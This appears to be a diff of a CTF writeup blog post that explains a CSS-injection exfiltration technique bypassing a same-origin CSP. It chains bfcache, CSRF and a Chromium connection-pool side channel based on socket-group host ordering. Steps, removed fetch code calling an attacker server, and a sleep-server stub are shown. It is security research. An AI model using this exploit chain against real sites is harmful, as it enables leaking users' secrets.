@@ -76,14 +76,13 @@
     
     
   </strong>
-  <span> • 2911 words</span>
-  <span> • 14 minute read</span>
+  <span> • 3581 words</span>
+  <span> • 17 minute read</span>
   
   
 </div>
 
-      <div class="content"><h1 id="remove-me-start-1145">REMOVE ME, START: 11:45</h1>
-<p>CSS Injections have always fascinated me. A few months ago, I asked myself: <em>&ldquo;is it possible to do CSS Exfiltration if default-src &lsquo;self&rsquo; is specified in the CSP?&rdquo;</em></p>
+      <div class="content"><p>CSS Injections have always fascinated me. A few months ago, I asked myself: <em>&ldquo;is it possible to do CSS Exfiltration if default-src &lsquo;self&rsquo; is specified in the CSP?&rdquo;</em></p>
 <p>Well, if you&rsquo;re reading this you already know the answer is yes. Also, I wrote a challenge about this for TRX CTF 2025: <a href="https://github.com/TheRomanXpl0it/TRX-CTF-2025/tree/main/web/keeper">Keeper</a>. This post will serve both as a writeup for the challenge and as an explanation of this new &ldquo;technique&rdquo;.</p>
 <h2 id="index">Index</h2>
 <ul>
@@ -95,7 +94,14 @@
 </li>
 <li><a href="#solution">Solution</a>
 <ul>
+<li><a href="#bfcache--csrf">bfcache &amp; CSRF</a></li>
 <li><a href="#swimming-in-the-connection-pool-">Swimming in the Connection Pool 🏊</a></li>
+<li><a href="#deep-diving-into-chromes-internals">Deep Diving Into Chromium Internals</a>
+<ul>
+<li><a href="#stalled-requests-priorities--more">Stalled requests, priorities &amp; more!</a></li>
+</ul>
+</li>
+<li><a href="#abusing-groupid-hash-ordering">Abusing GroupId hash ordering</a></li>
 </ul>
 </li>
 <li><a href="#putting-it-all-together">Putting it all together</a>
@@ -183,6 +189,7 @@
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> resp
 </span></span></code></pre></div><p>The goal now is pretty obvious: leak the bot code and then get the flag by sending a request to <code>/get-secret</code></p>
 <h2 id="solution">Solution</h2>
+<h3 id="bfcache--csrf">bfcache &amp; CSRF</h3>
 <p>To achieve our goal, we need to get the bot code and arbitrary HTML on the same page. How do we do this? Enter the <a href="https://developer.mozilla.org/en-US/docs/Glossary/bfcache">bfcache</a>. This cache stores entire pages, including dynamic modifications to the DOM. By letting the user visit a page we control, we can later go back in history using <code>window.history.go(-2)</code> where we will find the bot code.</p>
 <p>Result (With <code>d-none</code> removed):</p>
 <p><img src="/images/image-1.png" alt="alt text"></p>
@@ -297,24 +304,16 @@ However, the following technique involves counting the number of requests made. 
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">animation-delay</span>: <span style="color:#ae81ff">4</span><span style="color:#66d9ef">s</span>
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Now, in the <code>Network</code> tab of DevTools, you should now see 4 requests since the first character of the code is B, which was mapped to 4 requests. With the characters distinguishable from each other, it&rsquo;s now possible to count how many requests are sent by abusing the connection pool.</p>
-<p>Here&rsquo;s a solution that works most of the time and is relatively fast:</p>
-<ol>
-<li>Block 255 sockets by sending requests to 255 different origins that will respond after a long delay (+70 seconds) (eg. <code>&lt;i&gt;.sleep.example.com</code>)</li>
-<li>Block the last socket and keep its controller</li>
-<li>send a fetch request</li>
-<li>Wait until the first font request is made (in my exploit I wait 4 seconds)</li>
-<li><code>controller.abort()</code> from step <code>2</code></li>
-<li>Start sending fetch requests continuously (the exploit works even if you send requests to sleep.example.com or another host)</li>
-</ol>
-<p>Now, if everything is done correctly, this is what is going to happen:</p>
-<ol start="7">
-<li>Once the last socket is released, the request with the highest priority (the font request) will be processed first.</li>
-<li>Afterward, the socket will be assigned to a request from step <code>6</code></li>
-<li>This loop continues until all font requests are sent.</li>
-<li>Once all font requests are processed, the request from step <code>3</code> will load. This means all fonts have been requested.</li>
-<li>Finally, count how many fetch requests were sent from step <code>6</code>. The number of requests corresponds to the letter assigned to that character. For example, if 4 fetch requests are sent, the leaked letter will be <code>B</code>.</li>
-</ol>
-<p>In order to make this works, the origin of the request sent in step <code>3</code> must be alphabetically higher than the origin of the requests sent in step <code>6</code>. I didn&rsquo;t find anything online about this, so me and <code>@simonedimaria</code> started looking in the source code, specifically here: <a href="https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.cc;l=1090;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd?q=FindTopStalledGroup&amp;ss=chromium%2Fchromium%2Fsrc">https://source.chromium.org/chromium/chromium/src/+/main:net/socket/transport_client_socket_pool.cc;l=1090;drc=58fb75d86a0ad2642beec2d6c16b1e6c008e33cd?q=FindTopStalledGroup&amp;ss=chromium%2Fchromium%2Fsrc</a></p>
+<h3 id="deep-diving-into-chromium-internals">Deep Diving into Chromium Internals</h3>
+<h4 id="stalled-requests-priorities--more">Stalled requests, priorities &amp; more</h4>
+<p>In order to understand the exploit, it&rsquo;s important to clarify some important concepts.</p>
+<p><!-- raw HTML omitted -->A request is considered &ldquo;stalled&rdquo; when both of these conditions are met<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted -->:</p>
+<ul>
+<li>The socket pool has already handed out (or is in the process of connecting) as many sockets as allowed—that is, the total number of sockets in use is at least the global maximum.</li>
+<li>Despite the global limit being reached, there is at least one group with pending requests that has not yet hit its per-group socket limit. In other words, if a group could accept another socket (because it hasn’t reached its group limit), but the pool overall is full, then a request waiting in that group is stalled due to the global socket exhaustion.</li>
+</ul>
+<p>It&rsquo;s known that the request with the highest priority will go first once a socket will be released. What happens if there are two stalled requests with the same priority? Who will go first?</p>
+<p>I didn&rsquo;t find anything online about this, so I had to search in the Chromium source code (HUGE thanks to @simonedimaria to have helped me with this). Here are the functions that will determine which request will go first:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">// Search for the highest priority pending request, amongst the groups that
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// are not at the |max_sockets_per_group_| limit. Note: for requests with
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e">// the same priority, the winner is based on group hash ordering (and not
@@ -350,7 +349,180 @@ However, the following technique involves counting the number of requests made. 
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> has_stalled_group;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Apparently, in this case, Chrome sorts the origins by their alphabetical value and processes the lower ones first. Additionally, if the origins are the same, Chrome will process the requests that came first.</p>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> TransportClientSocketPool<span style="color:#f92672">::</span>CheckForStalledSocketGroups() {
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Loop until there&#39;s nothing more to do.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">while</span> (true) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// If we have idle sockets, see if we can give one to the top-stalled group.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    Group<span style="color:#f92672">*</span> top_group <span style="color:#f92672">=</span> <span style="color:#66d9ef">nullptr</span>;
+</span></span><span style="display:flex;"><span>    GroupId top_group_id;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>FindTopStalledGroup(<span style="color:#f92672">&amp;</span>top_group, <span style="color:#f92672">&amp;</span>top_group_id))
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (ReachedMaxSocketsLimit()) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (idle_socket_count_ <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        CloseOneIdleSocket();
+</span></span><span style="display:flex;"><span>      } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// We can&#39;t activate more sockets since we&#39;re already at our global
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#75715e">// limit.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Note that this may delete top_group.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    OnAvailableSocketSlot(top_group_id, top_group);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Note that <code>group_map_</code> <!-- raw HTML omitted -->is of <code>GroupMap</code><sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted -->, which is defined as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> GroupMap <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>map<span style="color:#f92672">&lt;</span>GroupId, raw_ptr<span style="color:#f92672">&lt;</span>Group, CtnExperimental<span style="color:#f92672">&gt;&gt;</span>;
+</span></span></code></pre></div><p>So, when two groups have the same pending priority, the code never updates the top group. As a result, the group that was already stored as <code>top_group</code> &ldquo;wins.&rdquo; Here, the iteration over <code>group_map_</code> isn’t arbitrary - it’s effectively ordered by the GroupId’s hash ordering. So even when priorities are equal, the winner is determined by that underlying ordering.</p>
+<p><!-- raw HTML omitted -->While <code>GroupId</code> is defined as<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">NET_EXPORT</span> GroupId {
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Returns the prefix for `privacy_mode` for logging.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> std<span style="color:#f92672">::</span>string_view GetPrivacyModeGroupIdPrefix(
+</span></span><span style="display:flex;"><span>        PrivacyMode privacy_mode);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Returns the prefix for `secure_dns_policy` for logging.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">static</span> std<span style="color:#f92672">::</span>string_view GetSecureDnsPolicyGroupIdPrefix(
+</span></span><span style="display:flex;"><span>        SecureDnsPolicy secure_dns_policy);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    GroupId();
+</span></span><span style="display:flex;"><span>    GroupId(url<span style="color:#f92672">::</span>SchemeHostPort destination,
+</span></span><span style="display:flex;"><span>            PrivacyMode privacy_mode,
+</span></span><span style="display:flex;"><span>            NetworkAnonymizationKey network_anonymization_key,
+</span></span><span style="display:flex;"><span>            SecureDnsPolicy secure_dns_policy,
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">bool</span> disable_cert_network_fetches);
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Finally, <code>url::SchemeHostPort</code> is defined as:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">COMPONENT_EXPORT</span>(URL) SchemeHostPort {
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">public</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span> ...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> <span style="color:#66d9ef">private</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Note: `port_` is declared first to control the sort order.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">uint16_t</span> port_ <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>string scheme_;
+</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>string host_;
+</span></span><span style="display:flex;"><span>};
+</span></span></code></pre></div><p>Now, let&rsquo;s go back to <code>GroupId</code> to <!-- raw HTML omitted -->see how the hash ordering is done<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted -->:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>... 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">operator</span><span style="color:#f92672">==</span>(<span style="color:#66d9ef">const</span> GroupId<span style="color:#f92672">&amp;</span> other) <span style="color:#66d9ef">const</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> std<span style="color:#f92672">::</span>tie(destination_, privacy_mode_, network_anonymization_key_,
+</span></span><span style="display:flex;"><span>                      secure_dns_policy_, disable_cert_network_fetches_) <span style="color:#f92672">==</span>
+</span></span><span style="display:flex;"><span>             std<span style="color:#f92672">::</span>tie(other.destination_, other.privacy_mode_,
+</span></span><span style="display:flex;"><span>                      other.network_anonymization_key_,
+</span></span><span style="display:flex;"><span>                      other.secure_dns_policy_,
+</span></span><span style="display:flex;"><span>                      other.disable_cert_network_fetches_);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">operator</span><span style="color:#f92672">&lt;</span>(<span style="color:#66d9ef">const</span> GroupId<span style="color:#f92672">&amp;</span> other) <span style="color:#66d9ef">const</span> {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> std<span style="color:#f92672">::</span>tie(destination_, privacy_mode_, network_anonymization_key_,
+</span></span><span style="display:flex;"><span>                      secure_dns_policy_, disable_cert_network_fetches_) <span style="color:#f92672">&lt;</span>
+</span></span><span style="display:flex;"><span>             std<span style="color:#f92672">::</span>tie(other.destination_, other.privacy_mode_,
+</span></span><span style="display:flex;"><span>                      other.network_anonymization_key_,
+</span></span><span style="display:flex;"><span>                      other.secure_dns_policy_,
+</span></span><span style="display:flex;"><span>                      other.disable_cert_network_fetches_);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Since <code>std::hash</code> will automatically sort the keys using the <code>&lt;</code> operator, the <code>group_map_</code> will be sorted, sequentially as <code>{port, scheme, host}</code> (there are also other factors, I will ignore them here because I didn&rsquo;t use them).</p>
+<p>Here&rsquo;s an example: Let&rsquo;s say there are two pending requests:</p>
+<ul>
+<li><code>request1</code>:
+<ul>
+<li>port: 80</li>
+<li>scheme: http</li>
+<li>host: <code>aaaaaa.sleep.example.com</code></li>
+</ul>
+</li>
+<li><code>request2</code>:</li>
+<li>port: 80</li>
+<li>scheme: http</li>
+<li>host: <code>zzzzzz.sleep.example.com</code></li>
+</ul>
+<p>The one who will go first is <code>Request1</code>, because:</p>
+<ul>
+<li><code>port</code> of <code>request1</code> == <code>port</code> of <code>request2</code></li>
+<li><code>scheme</code> of <code>request1</code> == <code>scheme</code> of <code>request2</code></li>
+<li><code>host</code> of <code>request1</code> &lt; <code>host</code> of <code>request2</code> (<code>ord(&quot;a&quot;) &lt; ord(&quot;z&quot;)</code>)</li>
+</ul>
+<p>Let&rsquo;s do another example:</p>
+<ul>
+<li><code>request1</code>:
+<ul>
+<li>port: 1337</li>
+<li>scheme: http</li>
+<li>host: <code>aaaaa.sleep.example.com</code></li>
+</ul>
+</li>
+<li><code>request2</code>:</li>
+<li>port: 80</li>
+<li>scheme: http</li>
+<li>host: <code>zzzzz.sleep.example.com</code></li>
+</ul>
+<p>The one who will go first is <code>request2</code>, because:</p>
+<ul>
+<li><code>port</code> of <code>request1</code> &gt; <code>port</code> of <code>request2</code> (80 &lt; 1337)</li>
+</ul>
+<p>Okay! Let the games begin!</p>
+<h3 id="abusing-groupid-hash-ordering">Abusing GroupId hash ordering</h3>
+<p>Here&rsquo;s the solution I came up with:</p>
+<ol>
+<li>As for every Connection Pool exploit, block 255 sockets by sending requests to 255 different origins that will respond after a long delay (+70 seconds) (eg. <code>&lt;i&gt;.sleep.example.com</code>)</li>
+<li>Block the last socket (same thing as above) and keep its controller</li>
+<li>send a fetch request to <code>zzzzzz.sleep.example.com</code></li>
+<li>Wait until the first font request is made (in my exploit I wait 4 seconds to do so)</li>
+<li>Abort the request from step <code>2</code> by using <code>controller.abort()</code></li>
+<li>Immediately start sending fetch requests continuously to <code>aaaaaa.sleep.example.com</code> (make sure to send them not in parallel. Also, wait the previous fetch request has loaded before making another one)</li>
+</ol>
+<p>Now, if everything is done correctly, this is what is going to happen:</p>
+<ol start="7">
+<li>Once the last socket is released, the request with the highest priority (the font request) will be processed first.</li>
+<li>Afterward, the socket will be assigned to the request from step <code>6</code>. Even though there are two pending requests, the request from the step <code>6</code> comes first since its host alphabetically lower than the one of the request from the step <code>3</code>. (<code>TransportClientSocketPool::CheckForStalledSocketGroups</code>)</li>
+<li>Once that request is consumed, another font request will come.</li>
+<li>This loop will repeat itself until there are no more font requests.</li>
+<li>Then, the last request from step <code>6</code> will be made. Now there are two pending request, as before. The request from step <code>6</code> will go first. Now, since there are no more pending requests, the request from the step <code>3</code> can load!</li>
+<li>Finally, count how many fetch requests from step <code>6</code> have been processed. The number of requests corresponds to the number of font requests sent from the CSS, which will correspond to the letter assigned to that number of requests! For example, if 4 fetch requests from step <code>6</code> are sent, that means the leaked letter will be <code>B</code></li>
+</ol>
+<p>Now the last thing to do is putting everything together!</p>
+<h2 id="putting-it-all-together">Putting it all together</h2>
+<p><code>server1: zzzz${i}.server.com</code><br>
+<code>server2: aaaa${i}.server.com</code></p>
+<p>Here&rsquo;s what the exploit is going to do:</p>
+<ul>
+<li>Generate the CSS payload as described earlier</li>
+<li>Open a popup to perform CSRF and set an arbitrary secret with the CSS payload</li>
+<li>Open another popup</li>
+<li>Use <code>window.history.go(-2)</code> to navigate back to the page with the bot code
+<ul>
+<li>The CSRF will modify the <code>session</code> cookie but the bot code will still remain in the bfcache</li>
+</ul>
+</li>
+<li>In the previously opened popup:
+<ul>
+<li>Create a hashmap (eg. 3 -&gt; A, 4 -&gt; B, 5 -&gt; C, &hellip;)</li>
+<li>Fill 255 sockets</li>
+<li>Repeat the following for each character in the code:
+<ul>
+<li>Fill the 256th socket and Keep its controller</li>
+<li>Send a fetch requests to <code>server1</code></li>
+<li>Wait until the font requests are triggered</li>
+<li>Release the 256th socket</li>
+<li>Immediately start sending fetch requests to <code>server2</code> in a loop</li>
+<li>Exit from that loop when a request to <code>server1</code> completes</li>
+<li>The number of requests sent to <code>server2</code> corresponds to a certain character</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Profit</li>
+</ul>
 <style type="text/css">
      
     .notice {
@@ -494,78 +666,8 @@ However, the following technique involves counting the number of requests made. 
   <path d="M150 128c82.813 0 150 67.188 150 150 0 82.813-67.188 150-150 150C67.187 428 0 360.812 0 278c0-82.813 67.188-150 150-150Zm25 243.555v-37.11c0-3.515-2.734-6.445-6.055-6.445h-37.5c-3.515 0-6.445 2.93-6.445 6.445v37.11c0 3.515 2.93 6.445 6.445 6.445h37.5c3.32 0 6.055-2.93 6.055-6.445Zm-.39-67.188 3.515-121.289c0-1.367-.586-2.734-1.953-3.516-1.172-.976-2.93-1.562-4.688-1.562h-42.968c-1.758 0-3.516.586-4.688 1.563-1.367.78-1.953 2.148-1.953 3.515l3.32 121.29c0 2.734 2.93 4.882 6.64 4.882h36.134c3.515 0 6.445-2.148 6.64-4.883Z"/>
 </svg>
 
-        </span>Note</p><p>This also works if a same-origin request is sent in step <code>3</code> (???)</p></div>
+        </span>Note</p><p>Ensure that each character is assigned enough requests. I noticed that the lowest character should be allocated at least 3 requests in order to leak it successfully.</p></div>
 
-<!-- raw HTML omitted -->
-<p>Example:</p>
-<p>This will send the request in the step <code>3</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fetch_step_3</span>(<span style="color:#a6e22e">i</span>){
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// `http://zzzz${i}.${MYSERVER}/0?q=${i}` also works
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`/`</span>, {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
-</span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">done</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>This will send the requests in the step <code>6</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fetch_step_6</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">async</span> (<span style="color:#a6e22e">i</span>) =&gt; {
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">performance</span>.<span style="color:#a6e22e">now</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">await</span> <span style="color:#a6e22e">fetch</span>(<span style="color:#e6db74">`http://aaaaa</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">.</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">MYSERVER</span><span style="color:#e6db74">}</span><span style="color:#e6db74">/0?q=</span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>, {
-</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mode</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;no-cors&#39;</span>
-</span></span><span style="display:flex;"><span>    });
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Now the requests will be loaded in the following order:</p>
-<ul>
-<li><a href="http://tester4.sleep.myserver.com/">http://tester4.sleep.myserver.com/</a> (step <code>6</code>)</li>
-<li><a href="http://tester5.sleep.myserver.com/">http://tester5.sleep.myserver.com/</a> (step <code>6</code>)</li>
-<li><a href="http://tester6.sleep.myserver.com/">http://tester6.sleep.myserver.com/</a> (step <code>6</code>)</li>
-<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>3</code>)</li>
-<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>3</code>)</li>
-<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>3</code>)</li>
-<li><a href="http://tester7.sleep.myserver.com/">http://tester7.sleep.myserver.com/</a> (step <code>6</code>)</li>
-<li><a href="http://tester8.sleep.myserver.com/">http://tester8.sleep.myserver.com/</a> (step <code>3</code>)</li>
-<li><a href="http://tester9.sleep.myserver.com/">http://tester9.sleep.myserver.com/</a> (step <code>3</code>)</li>
-</ul>
-<p>You can check the Connection ID to distinguish which request got the socket assigned first.</p>
-<p><img src="/images/image-3.png" alt="alt text"></p>
-<p>Let&rsquo;s run another test</p>
-<p><img src="/images/image-4.png" alt="alt text"></p>
-<p>You can see how the requests with the origin alphabetically lower will load first.</p>
-<p><img src="/images/keeper-priority.gif" alt="alt test"></p>
-<p>Now the last thing is putting everything together!</p>
-<h2 id="putting-it-all-together">Putting it all together</h2>
-<p><code>server1: zzzz${i}.server.com</code><br>
-<code>server2: aaaa${i}.server.com</code></p>
-<p>Here&rsquo;s what the exploit is going to do:</p>
-<ul>
-<li>Generate the CSS payload as described earlier</li>
-<li>Open a popup to perform CSRF and set an arbitrary secret with the CSS payload</li>
-<li>Open another popup</li>
-<li>Use <code>window.history.go(-2)</code> to navigate back to the page with the bot code
-<ul>
-<li>The CSRF will modify the <code>session</code> cookie but the bot code will still remain in the bfcache</li>
-</ul>
-</li>
-<li>In the previously opened popup:
-<ul>
-<li>Create a hashmap (eg. 3 -&gt; A, 4 -&gt; B, 5 -&gt; C, &hellip;)</li>
-<li>Fill 255 sockets</li>
-<li>Repeat the following for each character in the code:
-<ul>
-<li>Fill the 256th socket and Keep its controller</li>
-<li>Send 5 fetch requests to <code>server1</code></li>
-<li>Wait until the font requests are triggered</li>
-<li>Release the 256th socket</li>
-<li>Immediately start sending fetch requests to <code>server2</code> in a loop</li>
-<li>Exit from that loop when a request to <code>server1</code> completes</li>
-<li>The number of requests sent to <code>server2</code> corresponds to a certain character</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<!-- raw HTML omitted -->
-<p>Ensure that each character is assigned enough requests. I noticed that the lowest character should be allocated at least 3 requests in order to leak it successfully.</p>
 <!-- raw HTML omitted -->
 <h3 id="poc">PoC</h3>
 
@@ -577,9 +679,12 @@ However, the following technique involves counting the number of requests made. 
     </div>
 
 <p>You can download the exploit from <a href="https://github.com/salvatore-abello/web-challenges/tree/main/TRX%20CTF%202025/Keeper/exploit">here</a></p>
+<h3 id="limitations">Limitations</h3>
+<p>Works only on Chromium-based browsers.</p>
 <h2 id="conclusion">Conclusion</h2>
 <p>I had a great time creating and solving this challenge! Unfortunately, out of the three solvers, only one solved it as intended. :/</p>
-<p>The exploit could be much faster than it currently is. I also want to thank @simonedimaria for helping me with this research and keeping me sane. I’ll probably write another blog post about other findings.</p>
+<p>The exploit could be much faster than it currently is. I also want to thank @simonedimaria for helping me with this research and keeping me sane. I’ll probably write another blog post on other ways to exploit these findings :)</p>
+<p>Also, I hope you enjoyed this little writeup-research :heart:</p>
 <h2 id="final-payload">Final payload</h2>
 <h4 id="serverpy">server.py</h4>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> string
@@ -991,8 +1096,54 @@ However, the following technique involves counting the number of requests made. 
 </span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">main</span>();
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">script</span>&gt;
-</span></span></code></pre></div><p>Also, this is the server code I used to</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"></code></pre></div><div class="footnotes" role="doc-endnotes">
+</span></span></code></pre></div><p>Also, this is the server code I usually use to do Connection Pool-related exploits</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#f92672">package</span> <span style="color:#a6e22e">main</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> (
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;strconv&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;strings&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;time&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#e6db74">&#34;github.com/valyala/fasthttp&#34;</span>
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">workerSemaphore</span> = make(<span style="color:#66d9ef">chan</span> <span style="color:#66d9ef">struct</span>{}, <span style="color:#ae81ff">2048</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">func</span> <span style="color:#a6e22e">main</span>() {
